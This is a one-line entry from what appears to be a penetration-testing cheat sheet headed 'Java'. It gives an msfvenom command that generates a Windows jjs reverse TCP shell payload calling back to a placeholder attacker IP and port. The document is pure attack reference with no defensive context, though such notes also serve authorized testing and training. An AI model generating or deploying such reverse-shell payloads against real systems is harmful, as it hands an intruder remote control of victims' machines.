# Java

## 01 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/windows/jjs_reverse_tcp lhost=<IP> lport=<PORT>
```